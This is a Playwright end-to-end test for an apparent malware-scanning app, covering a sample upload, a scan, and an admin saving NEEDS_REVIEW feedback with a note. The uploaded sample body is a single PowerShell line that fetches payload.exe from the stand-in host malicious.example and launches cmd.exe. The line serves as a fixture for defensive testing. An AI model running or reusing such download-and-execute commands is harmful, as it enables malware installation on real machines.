import { expect, test } from "@playwright/test";
import { signInAs, startScanAndWaitForReport, uploadTextSample } from "./helpers";

test("lets an admin review a suspicious scan and save feedback", async ({ page }) => {
  await signInAs(page, "Demo Analyst");

  const filename = `e2e-suspicious-${Date.now()}.ps1`;
  const scanId = await uploadTextSample(page, {
    name: filename,
    body: "powershell Invoke-WebRequest http://malicious.example/payload.exe; Start-Process cmd.exe\n",
  });

  await startScanAndWaitForReport(page);
  await signInAs(page, "Demo Admin");
  await page.goto("/admin");

  const reviewCard = page.getByTestId(`admin-review-file-${scanId}`);
  await expect(reviewCard.getByText(filename)).toBeVisible();

  const note = `E2E reviewer note ${Date.now()}`;
  await reviewCard.getByRole("combobox", { name: /feedback label/i }).selectOption("NEEDS_REVIEW");
  await reviewCard.getByPlaceholder("Optional reviewer note").fill(note);
  await reviewCard.getByRole("button", { name: /save feedback/i }).click();

  await expect(reviewCard.getByText(note)).toBeVisible();
});
